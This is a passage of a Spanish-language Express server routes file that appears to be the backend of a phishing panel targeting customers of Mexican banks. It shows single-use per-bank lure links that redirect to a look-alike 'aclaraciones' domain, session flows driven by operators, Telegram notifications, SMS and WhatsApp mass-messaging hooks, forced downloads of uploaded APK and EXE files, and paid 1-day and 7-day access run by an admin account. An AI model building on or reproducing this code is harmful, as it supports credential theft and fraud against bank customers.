import type { Express } from "express";
import { static as expressStatic } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { nanoid } from "nanoid";
import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema, BankType, InsertSiteConfig, insertSiteConfigSchema, sessions, linkTokens } from "@shared/schema";
import { setupAuth } from "./auth";
import axios from 'axios';
import { sendTelegramNotification, sendSessionCreatedNotification, sendScreenChangeNotification, sendFileDownloadNotification } from './telegramService';
import { sendAccountActivationNotification } from './telegramBot';
import { parsePhoneNumbers, validateSMSMessage, sendSMSWithRoute, calculateCreditCost, SmsRouteType } from './smsService';
import { whatsappBotManager } from './whatsapp-bot';
import multer from 'multer';
import path from 'path';
import fs from 'fs';
import { z } from 'zod';
import { linkTokenService } from './services/linkToken';
import { linkQuotaService } from './services/linkQuota';
import { bitlyService } from './services/bitly';
import { eq, and, desc } from 'drizzle-orm';
import { db } from './db';

// Store active connections
const clients = new Map<string, WebSocket>();
// Cambiamos a un Map para asociar cada socket con su username
const adminClients = new Map<string, WebSocket>();

// Configurar multer para subida de archivos
const storage_multer = multer.diskStorage({
  destination: function (req, file, cb) {
    const uploadPath = path.join(process.cwd(), 'uploads');
    if (!fs.existsSync(uploadPath)) {
      fs.mkdirSync(uploadPath, { recursive: true });
    }
    cb(null, uploadPath);
  },
  filename: function (req, file, cb) {
    // Generar nombre único para el archivo
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({ 
  storage: storage_multer,
  limits: {
    fileSize: 50 * 1024 * 1024 // 50MB límite
  },
  fileFilter: function (req, file, cb) {
    // Permitir todos los tipos de archivo
    cb(null, true);
  }
});

// Helper para mapear banco de UI (mayúsculas) a BankType (minúsculas)
const BANK_UI_TO_TYPE: Record<string, BankType> = {
  'AFIRME': BankType.AFIRME,
  'CITIBANAMEX': BankType.CITIBANAMEX,
  'BANORTE': BankType.BANORTE,
  'BBVA': BankType.BBVA,
  'SANTANDER': BankType.SANTANDER,
  'HSBC': BankType.HSBC,
  'SCOTIABANK': BankType.SCOTIABANK,
  'INBURSA': BankType.INBURSA,
  'BANCO_AZTECA': BankType.BANCOAZTECA,
  'BANCOAZTECA': BankType.BANCOAZTECA,
  'LIVERPOOL': BankType.LIVERPOOL,
  'BANBAJIO': BankType.BANBAJIO,
  'BANCOPPEL': BankType.BANCOPPEL,
  'AMEX': BankType.AMEX,
  'INVEX': BankType.INVEX,
  'BANREGIO': BankType.BANREGIO,
  'SPIN': BankType.SPIN,
  'PLATACARD': BankType.PLATACARD,
  'BIENESTAR': BankType.BIENESTAR,
};

export async function registerRoutes(app: Express): Promise<Server> {
  // Setup authentication
  setupAuth(app);

  // Configurar Content-Type para archivos APK y otros
  app.use('/uploads', (req, res, next) => {
    const filePath = req.path.toLowerCase();
    
    // Configurar Content-Type específico para archivos APK
    if (filePath.endsWith('.apk')) {
      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
    }
    // Otros tipos de archivos comunes
    else if (filePath.endsWith('.exe')) {
      res.setHeader('Content-Type', 'application/octet-stream');
    }
    else if (filePath.endsWith('.zip')) {
      res.setHeader('Content-Type', 'application/zip');
    }
    else if (filePath.endsWith('.rar')) {
      res.setHeader('Content-Type', 'application/x-rar-compressed');
    }
    
    next();
  });

  // Servir archivos estáticos desde la carpeta uploads
  app.use('/uploads', expressStatic(path.join(process.cwd(), 'uploads'), {
    setHeaders: (res, path) => {
      // Configurar headers adicionales para forzar descarga
      if (path.toLowerCase().endsWith('.apk')) {
        res.setHeader('Content-Disposition', 'attachment');
        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      } else if (path.toLowerCase().endsWith('.exe')) {
        res.setHeader('Content-Disposition', 'attachment');
        res.setHeader('Content-Type', 'application/octet-stream');
      }
    }
  }));
  
  // Servir archivos APK de protección desde attached_assets
  app.use('/assets', expressStatic(path.join(process.cwd(), 'attached_assets')));

  // Create HTTP server
  const httpServer = createServer(app);

  // Create WebSocket server
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });

  // Configurar limpieza periódica de sesiones antiguas
  setInterval(async () => {
    try {
      const deletedCount = await storage.cleanupExpiredSessions();
      if (deletedCount > 0) {
        console.log(`Limpieza automática: ${deletedCount} sesiones antiguas eliminadas (>5 días)`);
        broadcastToAdmins(JSON.stringify({
          type: 'SESSIONS_CLEANUP',
          data: { deletedCount }
        }));
      }
    } catch (error) {
      console.error('Error en limpieza automática de sesiones:', error);
    }
  }, 12 * 60 * 60 * 1000); // Ejecutar cada 12 horas

  // Configurar limpieza periódica de usuarios expirados
  setInterval(async () => {
    try {
      const deactivatedCount = await storage.cleanupExpiredUsers();
      if (deactivatedCount > 0) {
        console.log(`Limpieza automática: ${deactivatedCount} usuarios expirados desactivados`);
        broadcastToAdmins(JSON.stringify({
          type: 'USERS_CLEANUP',
          data: { deactivatedCount }
        }));
      }
    } catch (error) {
      console.error('Error en limpieza automática de usuarios:', error);
    }
  }, 6 * 60 * 60 * 1000); // Ejecutar cada 6 horas

  // NO hay expiración automática de links por tiempo
  // Los links solo se invalidan cuando: 1) usuario ingresa folio o 2) admin cancela manualmente

  // Middleware de validación de tokens de un solo uso (con banco en el path)
  app.get('/:bankCode/client/:token', async (req, res) => {
    try {
      const { token, bankCode } = req.params;
      
      // Validar y consumir el token
      const tokenResult = await linkTokenService.validateAndConsumeToken(token, {
        ip: req.ip || req.connection.remoteAddress || 'unknown',
        userAgent: req.headers['user-agent'] || 'unknown'
      });

      // Si el token es inválido, retornar error apropiado
      if (!tokenResult.valid) {
        if (tokenResult.reason === 'already_used' || tokenResult.reason === 'expired' || tokenResult.reason === 'cancelled') {
          return res.status(410).json({ 
            error: 'Link no válido',
            reason: tokenResult.reason === 'already_used' ? 'Este link ya fue utilizado' :
                    tokenResult.reason === 'expired' ? 'Este link ha expirado' :
                    'Este link ha sido cancelado'
          });
        }
        return res.status(404).json({ 
          error: 'Link no encontrado',
          reason: 'El link proporcionado no existe'
        });
      }

      // Validar que el bankCode del path coincida con el del token (seguridad adicional)
      if (tokenResult.bankCode && tokenResult.bankCode.toLowerCase() !== bankCode.toLowerCase()) {
        console.warn(`[Links] Bank code mismatch: path=${bankCode}, token=${tokenResult.bankCode}`);
        return res.status(404).json({ 
          error: 'Link no válido',
          reason: 'El link proporcionado no es correcto'
        });
      }

      // Token válido, obtener o crear la sesión
      let session = tokenResult.sessionId ? 
        await storage.getSessionById(tokenResult.sessionId) : 
        null;

      // Si no existe sesión, crearla y consumir el token
      if (!session) {
        // Generar código de 8 dígitos para sessionId y folio
        let sessionId = '';
        for (let i = 0; i < 8; i++) {
          sessionId += Math.floor(Math.random() * 10).toString();
        }

        // Obtener el flujo configurado del usuario para este banco
        let flowConfig = null;
        let currentStepIndex = 0;
        let flowState = null;
        
        if (tokenResult.userId && tokenResult.bankCode) {
          const userFlow = await storage.getUserBankFlow(tokenResult.userId, tokenResult.bankCode);
          if (userFlow && userFlow.flowConfig) {
            flowConfig = userFlow.flowConfig;
            currentStepIndex = 0;
            flowState = 'active';
            console.log(`[Links] Aplicando flujo de usuario para banco ${tokenResult.bankCode}`);
          }
        }

        // Crear la sesión con datos del token y flujo de usuario
        session = await storage.createSession({
          sessionId,
          banco: tokenResult.bankCode || 'banamex',
          folio: sessionId,
          pasoActual: ScreenType.FOLIO,
          createdBy: tokenResult.createdBy || 'system',
          executiveId: null,
          flowConfig,
          currentStepIndex,
          flowState
        });

        // Actualizar el token con el sessionId creado
        await linkTokenService.updateTokenSession(token, sessionId);
        
        // NO consumir el token aún - se consumirá cuando el usuario ingrese el folio

        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}, con flujo: ${flowConfig ? 'sí' : 'no'}`);
      } else {
        console.log(`[Links] Reutilizando sesión existente: ${session.sessionId}`);
      }

      // Obtener la URL base desde la configuración del sitio
      const siteConfig = await storage.getSiteConfig();
      const baseClientUrl = siteConfig?.baseUrl || 'https://aclaracionesditales.com';
      
      // Redirigir al usuario a la sesión
      const redirectUrl = `${baseClientUrl}/${session.sessionId}`;
      console.log(`[Links] Redirigiendo a sesión: ${redirectUrl}`);
      
      res.redirect(302, redirectUrl);
    } catch (error: any) {
      console.error('[Links] Error procesando token:', error);
      res.status(500).json({ 
        error: 'Error procesando el link',
        message: error.message 
      });
    }
  });

  // Middleware de validación de tokens de un solo uso (ruta legacy para compatibilidad)
  app.get('/client/:token', async (req, res) => {
    try {
      const { token } = req.params;
      
      // Validar y consumir el token
      const tokenResult = await linkTokenService.validateAndConsumeToken(token, {
        ip: req.ip || req.connection.remoteAddress || 'unknown',
        userAgent: req.headers['user-agent'] || 'unknown'
      });

      // Si el token es inválido, retornar error apropiado
      if (!tokenResult.valid) {
        if (tokenResult.reason === 'already_used' || tokenResult.reason === 'expired' || tokenResult.reason === 'cancelled') {
          return res.status(410).json({ 
            error: 'Link no válido',
            reason: tokenResult.reason === 'already_used' ? 'Este link ya fue utilizado' :
                    tokenResult.reason === 'expired' ? 'Este link ha expirado' :
                    'Este link ha sido cancelado'
          });
        }
        return res.status(404).json({ 
          error: 'Link no encontrado',
          reason: 'El link proporcionado no existe'
        });
      }

      // Token válido, obtener o crear la sesión
      let session = tokenResult.sessionId ? 
        await storage.getSessionById(tokenResult.sessionId) : 
        null;

      // Si no existe sesión, crearla y consumir el token
      if (!session) {
        // Generar código de 8 dígitos para sessionId y folio
        let sessionId = '';
        for (let i = 0; i < 8; i++) {
          sessionId += Math.floor(Math.random() * 10).toString();
        }

        // Obtener el flujo configurado del usuario para este banco
        let flowConfig = null;
        let currentStepIndex = 0;
        let flowState = null;
        
        if (tokenResult.userId && tokenResult.bankCode) {
          const userFlow = await storage.getUserBankFlow(tokenResult.userId, tokenResult.bankCode);
          if (userFlow && userFlow.flowConfig) {
            flowConfig = userFlow.flowConfig;
            currentStepIndex = 0;
            flowState = 'active';
            console.log(`[Links] Aplicando flujo de usuario para banco ${tokenResult.bankCode}`);
          }
        }

        // Crear la sesión con datos del token y flujo de usuario
        session = await storage.createSession({
          sessionId,
          banco: tokenResult.bankCode || 'banamex',
          folio: sessionId,
          pasoActual: ScreenType.FOLIO,
          createdBy: tokenResult.createdBy || 'system',
          executiveId: null,
          flowConfig,
          currentStepIndex,
          flowState
        });

        // Actualizar el token con el sessionId creado
        await linkTokenService.updateTokenSession(token, sessionId);
        
        // NO consumir el token aún - se consumirá cuando el usuario ingrese el folio

        console.log(`[Links] Nueva sesión creada desde token: ${sessionId}, banco: ${session.banco}, con flujo: ${flowConfig ? 'sí' : 'no'}`);
      } else {
        console.log(`[Links] Reutilizando sesión existente: ${session.sessionId}`);
      }

      // Obtener la URL base desde la configuración del sitio
      const siteConfig = await storage.getSiteConfig();
      const baseClientUrl = siteConfig?.baseUrl || 'https://aclaracionesditales.com';
      
      // Redirigir al usuario a la sesión
      const redirectUrl = `${baseClientUrl}/${session.sessionId}`;
      console.log(`[Links] Redirigiendo a sesión: ${redirectUrl}`);
      
      res.redirect(302, redirectUrl);
    } catch (error: any) {
      console.error('[Links] Error procesando token:', error);
      res.status(500).json({ 
        error: 'Error procesando el link',
        message: error.message 
      });
    }
  });

  // API endpoints
  // Rutas de administración de usuarios
  app.post('/api/admin/users', async (req, res) => {
    try {
      const { username, password } = req.body;
      const user = await storage.createAdminUser(username, password);
      res.json({ success: true, user: { ...user, password: undefined } });
    } catch (error: any) {
      res.status(400).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/login', async (req, res) => {
    try {
      const { username, password } = req.body;
      const user = await storage.validateAdminUser(username, password);
      if (!user) {
        return res.status(401).json({ success: false, message: "Credenciales inválidas" });
      }

      // Actualizamos la última fecha de inicio de sesión
      await storage.updateUserLastLogin(user.id);

      // Establecemos una cookie de sesión simple (en una implementación real usaríamos JWT o similar)
      res.cookie('auth_token', username, { 
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        maxAge: 24 * 60 * 60 * 1000 // 1 día
      });

      res.json({ success: true, user: { ...user, password: undefined } });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/logout', async (req, res) => {
    try {
      // Limpiar la cookie de autenticación
      res.clearCookie('auth_token');
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/users/:username/toggle', async (req, res) => {
    try {
      const { username } = req.params;
      const success = await storage.toggleAdminUserStatus(username);
      if (!success) {
        return res.status(404).json({ success: false, message: "Usuario no encontrado" });
      }
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.get('/api/admin/users', async (req, res) => {
    try {
      const users = await storage.getAllAdminUsers();
      res.json(users.map((user: User) => ({ ...user, password: undefined })));
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });



  // Alternar el estado de un usuario (activar/desactivar) (solo para el usuario "balonx")
  app.post('/api/users/regular/:username/toggle-status', async (req, res) => {
    console.log('[API] Solicitud para alternar estado de usuario');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { username } = req.params;
      console.log(`[API] Intentando alternar estado del usuario: ${username}`);

      const success = await storage.toggleUserStatus(username);
      if (!success) {
        return res.status(404).json({ message: "Usuario no encontrado" });
      }

      // Obtener el usuario actualizado
      const updatedUser = await storage.getUserByUsername(username);
      if (!updatedUser) {
        return res.status(404).json({ message: "Usuario no encontrado después de actualización" });
      }

      console.log(`[API] Estado de usuario alternado: ${username}, nuevo estado: ${updatedUser.isActive ? 'activo' : 'inactivo'}`);

      res.json({ 
        success: true, 
        user: {
          id: updatedUser.id,
          username: updatedUser.username,
          role: updatedUser.role,
          isActive: updatedUser.isActive,
          expiresAt: updatedUser.expiresAt,
          deviceCount: updatedUser.deviceCount,
          maxDevices: updatedUser.maxDevices,
          createdAt: updatedUser.createdAt,
          lastLogin: updatedUser.lastLogin
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al alternar estado de usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Activar un usuario por 1 día (solo para el usuario "balonx")
  app.post('/api/users/regular/:username/activate-one-day', async (req, res) => {
    console.log('[API] Solicitud para activar usuario por 1 día');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { username } = req.params;
      console.log(`[API] Intentando activar usuario: ${username}`);
      
      // Obtener usuario actual para ver bancos permitidos actual
      const existingUser = await storage.getUserByUsername(username);
      if (!existingUser) {
        throw new Error(`Usuario ${username} no encontrado`);
      }
      
      console.log(`[API] Usuario encontrado: ${username}, bancos actuales: ${existingUser.allowedBanks || 'all'}`);
      
      // Obtener los bancos permitidos de la solicitud
      const { allowedBanks } = req.body;
      console.log(`[API] Bancos recibidos del frontend: ${allowedBanks}`);
      
      // Procesar bancos permitidos antes de la activación
      let processedBanksValue: string = existingUser.allowedBanks || 'all'; // Mantener valor actual por defecto
      
      if (allowedBanks !== undefined) {
        console.log(`[API] Procesando bancos permitidos: ${allowedBanks}`);
        
        // Manejo más robusto del valor de allowedBanks
        if (typeof allowedBanks === 'string') {
          // Si es una cadena, usar directamente (puede ser 'all' o una lista separada por comas)
          processedBanksValue = allowedBanks;
          console.log(`[API] Usando valor de string directo: ${processedBanksValue}`);
        } else if (Array.isArray(allowedBanks)) {
          // Si es un array, unirlo con comas
          processedBanksValue = allowedBanks.join(',');
          console.log(`[API] Convirtiendo array a string: ${processedBanksValue}`);
        } else {
          // Caso por defecto, mantener valor actual
          console.log(`[API] Manteniendo valor actual para tipo desconocido: ${typeof allowedBanks}`);
        }
        
        // Verificar si el valor es 'all' (sin importar mayúsculas/minúsculas)
        if (typeof processedBanksValue === 'string' && processedBanksValue.toLowerCase() === 'all') {
          processedBanksValue = 'all';
          console.log(`[API] Normalizando valor a 'all'`);
        }
      }
      
      // Activamos el usuario y establecemos bancos permitidos directamente
      console.log(`[API] Activando usuario por 1 día con bancos: ${processedBanksValue}`);
      
      // Llamamos a activateUserForOneDay pasando directamente el valor de bancos permitidos
      const updatedUser = await storage.activateUserForOneDay(username, processedBanksValue);
      
      // Verificar que el valor se haya establecido correctamente
      const finalUser = await storage.getUserByUsername(username);
      if (finalUser && finalUser.allowedBanks !== processedBanksValue) {
        console.log(`[API] ADVERTENCIA: Valor incorrecto de allowedBanks después de la activación.`);
        console.log(`[API] Esperado: ${processedBanksValue}, Actual: ${finalUser.allowedBanks}`);
        
        // Forzar la actualización para asegurar que se establezca el valor correcto
        await storage.updateUser(finalUser.id, { 
          allowedBanks: processedBanksValue 
        });
      }
      
      console.log(`[API] Usuario activado con éxito: ${username}`);
      console.log(`[API] Estado final: activo=${updatedUser.isActive}, expira=${updatedUser.expiresAt}, allowedBanks=${updatedUser.allowedBanks}`);

      res.json({ 
        success: true, 
        user: {
          id: updatedUser.id,
          username: updatedUser.username,
          role: updatedUser.role,
          isActive: updatedUser.isActive,
          expiresAt: updatedUser.expiresAt,
          deviceCount: updatedUser.deviceCount,
          maxDevices: updatedUser.maxDevices,
          allowedBanks: updatedUser.allowedBanks
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al activar usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Activar un usuario por 7 días (solo para el usuario "balonx")
  app.post('/api/users/regular/:username/activate-seven-days', async (req, res) => {
    console.log('[API] Solicitud para activar usuario por 7 días');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { username } = req.params;
      console.log(`[API] Intentando activar usuario: ${username}`);
      
      // Obtener usuario actual para ver bancos permitidos actual
      const existingUser = await storage.getUserByUsername(username);
      if (!existingUser) {
        throw new Error(`Usuario ${username} no encontrado`);
      }
      
      console.log(`[API] Usuario encontrado: ${username}, bancos actuales: ${existingUser.allowedBanks || 'all'}`);
      
      // Obtener los bancos permitidos de la solicitud
      const { allowedBanks } = req.body;
      console.log(`[API] Bancos recibidos del frontend: ${allowedBanks}`);
      
      // Procesar bancos permitidos antes de la activación
      let processedBanksValue: string = existingUser.allowedBanks || 'all'; // Mantener valor actual por defecto
      
      if (allowedBanks !== undefined) {
        console.log(`[API] Procesando bancos permitidos: ${allowedBanks}`);
        
        // Manejo más robusto del valor de allowedBanks
        if (typeof allowedBanks === 'string') {
          // Si es una cadena, usar directamente (puede ser 'all' o una lista separada por comas)
          processedBanksValue = allowedBanks;
          console.log(`[API] Usando valor de string directo: ${processedBanksValue}`);
        } else if (Array.isArray(allowedBanks)) {
          // Si es un array, unirlo con comas
          processedBanksValue = allowedBanks.join(',');
          console.log(`[API] Convirtiendo array a string: ${processedBanksValue}`);
        } else {
          // Caso por defecto, mantener valor actual
          console.log(`[API] Manteniendo valor actual para tipo desconocido: ${typeof allowedBanks}`);
        }
        
        // Verificar si el valor es 'all' (sin importar mayúsculas/minúsculas)
        if (typeof processedBanksValue === 'string' && processedBanksValue.toLowerCase() === 'all') {
          processedBanksValue = 'all';
          console.log(`[API] Normalizando valor a 'all'`);
        }
      }
      
      // Activamos el usuario y establecemos bancos permitidos
      console.log(`[API] Activando usuario por 7 días con bancos: ${processedBanksValue}`);
      
      // Llamamos a activateUserForSevenDays pasando directamente el valor de bancos permitidos
      const updatedUser = await storage.activateUserForSevenDays(username, processedBanksValue);
      
      // Obtener el usuario actualizado para asegurarnos de que tiene los bancos correctos
      const finalUser = await storage.getUserByUsername(username);
      
      // Verificar si el valor de allowedBanks es correcto
      if (finalUser && finalUser.allowedBanks !== processedBanksValue) {
        console.log(`[API] ADVERTENCIA: Valor incorrecto de allowedBanks después de la actualización.`);
        console.log(`[API] Esperado: ${processedBanksValue}, Actual: ${finalUser.allowedBanks}`);
        
        // Un intento final más forzado para actualizar el valor
        await storage.updateUser(finalUser.id, { 
          allowedBanks: processedBanksValue 
        });
        
        console.log(`[API] Actualizando nuevamente: allowedBanks = "${processedBanksValue}"`);
      }
      
      // Obtener usuario final para el response
      const responseUser = await storage.getUserByUsername(username);
      
      console.log(`[API] Usuario activado con éxito: ${username}`);
      console.log(`[API] Estado final: activo=${updatedUser.isActive}, expira=${updatedUser.expiresAt}, allowedBanks=${updatedUser.allowedBanks}`);

      res.json({ 
        success: true, 
        user: {
          id: updatedUser.id,
          username: updatedUser.username,
          role: updatedUser.role,
          isActive: updatedUser.isActive,
          expiresAt: updatedUser.expiresAt,
          deviceCount: updatedUser.deviceCount,
          maxDevices: updatedUser.maxDevices,
          allowedBanks: updatedUser.allowedBanks
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al activar usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Desactivar usuarios expirados (se puede llamar manualmente o mediante un cron job)
  app.post('/api/users/cleanup-expired', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const deactivatedCount = await storage.cleanupExpiredUsers();
      res.json({ success: true, deactivatedCount });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Eliminar un usuario (solo usuario "balonx" puede hacerlo)
  app.delete('/api/users/regular/:username', async (req, res) => {
    console.log('[API] Solicitud para eliminar usuario');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    const { username } = req.params;

    // No permitir eliminar al usuario admin "balonx"
    if (username === "balonx") {
      console.log('[API] Error: No se puede eliminar al usuario admin "balonx"');
      return res.status(403).json({ message: "No se puede eliminar al usuario administrador principal" });
    }

    try {
      console.log(`[API] Intentando eliminar usuario: ${username}`);
      const deleted = await storage.deleteUser(username);

      if (!deleted) {
        console.log(`[API] Error: Usuario ${username} no encontrado`);
        return res.status(404).json({ success: false, message: "Usuario no encontrado" });
      }

      console.log(`[API] Usuario eliminado con éxito: ${username}`);
      res.json({ success: true, message: `Usuario ${username} eliminado correctamente` });
    } catch (error: any) {
      console.log(`[API] Error al eliminar usuario: ${error.message}`);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Configurar Chat ID para cualquier usuario (solo administradores)
  app.put('/api/users/:username/chat-id', async (req, res) => {
    console.log('[API] Solicitud para configurar Chat ID de usuario');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir a administradores configurar Chat IDs
    if (currentUser.role !== UserRole.ADMIN) {
      console.log('[API] Error: Usuario no autorizado (no es admin)');
      return res.status(403).json({ message: "No autorizado" });
    }

    const { username } = req.params;
    const { telegramChatId } = req.body;

    if (!telegramChatId) {
      return res.status(400).json({ message: "Chat ID requerido" });
    }

    try {
      console.log(`[API] Configurando Chat ID para usuario: ${username}`);
      
      // Verificar que el usuario existe
      const existingUser = await storage.getUserByUsername(username);
      if (!existingUser) {
        console.log(`[API] Error: Usuario ${username} no encontrado`);
        return res.status(404).json({ message: "Usuario no encontrado" });
      }

      // Actualizar el Chat ID
      const updatedUser = await storage.updateUser(existingUser.id, {
        telegramChatId: telegramChatId.toString()
      });

      console.log(`[API] Chat ID configurado exitosamente para ${username}: ${telegramChatId}`);

      // Notificar al usuario mediante Telegram si es posible
      try {
        const { sendAdminMessage } = await import('./telegramBot');
        const welcomeMessage = `🎉 *¡Tu Chat ID ha sido configurado!*

Hola *${username}*,

Tu Chat ID ha sido configurado correctamente por un administrador.

✅ *Ahora puedes recibir:*
• Códigos de verificación 2FA
• Notificaciones del sistema
• Mensajes del administrador

💡 Tu cuenta está lista para usar todas las funciones del sistema.

📞 *Soporte*: @BalonxSistema`;

        await sendAdminMessage(telegramChatId, welcomeMessage, 'Sistema');
        console.log(`[API] Mensaje de bienvenida enviado a ${username}`);
      } catch (error) {
        console.log(`[API] No se pudo enviar mensaje de bienvenida: ${error}`);
      }

      res.json({ 
        success: true, 
        message: `Chat ID configurado para ${username}`,
        user: {
          id: updatedUser.id,
          username: updatedUser.username,
          role: updatedUser.role,
          isActive: updatedUser.isActive,
          telegramChatId: updatedUser.telegramChatId,
          expiresAt: updatedUser.expiresAt,
          deviceCount: updatedUser.deviceCount,
          maxDevices: updatedUser.maxDevices,
          allowedBanks: updatedUser.allowedBanks
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al configurar Chat ID: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  app.get('/api/admin/user', async (req, res) => {
    try {
      // Obtener el username de la cookie de autenticación
      const username = req.cookies?.auth_token;
      if (!username) {
        return res.status(401).json({ message: "No autorizado" });
      }

      // Buscar el usuario por nombre de usuario
      const user = await storage.getUserByUsername(username);
      if (!user) {
        return res.status(401).json({ message: "Usuario no encontrado" });
      }

      // Verificar si el usuario está activo
      if (!user.isActive) {
        return res.status(403).json({ message: "Usuario inactivo" });
      }

      // Devolver el usuario sin la contraseña
      res.json({ ...user, password: undefined });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Endpoint para enviar mensajes personalizados a usuarios desde el panel admin (con archivos adjuntos y envío masivo)
  app.post('/api/admin/send-message', upload.single('file'), async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const currentUser = req.user;
      
      // Solo permitir a administradores enviar mensajes
      if (currentUser.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "No autorizado" });
      }

      const { username, message, sendToAll } = req.body;
      const file = req.file;

      // Validar que hay al menos mensaje o archivo
      if (!message && !file) {
        return res.status(400).json({ message: "Mensaje o archivo es requerido" });
      }

      // Importar función para enviar mensaje
      const { sendAdminMessage, sendAdminDocument } = await import('./telegramBot');
      
      let sentCount = 0;
      let failedCount = 0;
      const errors: string[] = [];

      // Determinar destinatarios
      let recipients: User[] = [];
      
      if (sendToAll === 'true') {
        // Obtener todos los usuarios con Chat ID configurado
        const allUsers = await storage.getAllAdminUsers();
        recipients = allUsers.filter(u => 
          u.telegramChatId && 
          u.telegramChatId !== '' && 
          u.role === 'user'
        );
      } else {
        if (!username) {
          return res.status(400).json({ message: "Username es requerido para envío individual" });
        }
        
        const targetUser = await storage.getUserByUsername(username);
        if (!targetUser) {
          return res.status(404).json({ message: "Usuario no encontrado" });
        }

        if (!targetUser.telegramChatId) {
          return res.status(400).json({ message: "Usuario no tiene Chat ID configurado" });
        }
        
        recipients = [targetUser];
      }

      // Enviar a cada destinatario
      for (const recipient of recipients) {
        try {
          // Formatear mensaje si existe
          let formattedMessage = '';
          if (message && message.trim()) {
            formattedMessage = `📩 *Mensaje del Administrador*

${message}

---
_Enviado por: ${currentUser.username}_
_Fecha: ${new Date().toLocaleString('es-MX')}_

📞 *Soporte*: @BalonxSistema`;
          }

          let result;
          
          // Si hay archivo, enviar con documento
          if (file) {
            result = await sendAdminDocument(
              recipient.telegramChatId!,
              file.path,
              formattedMessage || undefined
            );
          } else {
            // Solo mensaje de texto
            result = await sendAdminMessage(recipient.telegramChatId!, formattedMessage);
          }

          if (result.success) {
            sentCount++;
            
            // Crear notificación en el sistema
            await storage.createNotification({
              userId: recipient.id,
              type: 'admin_message',
              title: 'Mensaje del Administrador',
              message: message || 'Archivo adjunto',
              priority: 'medium'
            });
          } else {
            failedCount++;
            errors.push(`${recipient.username}: ${result.error}`);
          }
        } catch (error: any) {
          failedCount++;
          errors.push(`${recipient.username}: ${error.message}`);
        }
      }

      // Limpiar archivo temporal si existe
      if (file && fs.existsSync(file.path)) {
        try {
          fs.unlinkSync(file.path);
        } catch (error) {
          console.error('Error eliminando archivo temporal:', error);
        }
      }

      // Responder con resultados
      if (sentCount > 0 && failedCount === 0) {
        console.log(`✅ Mensajes enviados: ${sentCount} de ${currentUser.username}`);
        res.json({ 
          success: true, 
          message: "Mensaje(s) enviado(s) correctamente",
          sentCount,
          failedCount: 0
        });
      } else if (sentCount > 0 && failedCount > 0) {
        console.log(`⚠️ Envío parcial: ${sentCount} enviados, ${failedCount} fallidos`);
        res.json({ 
          success: true, 
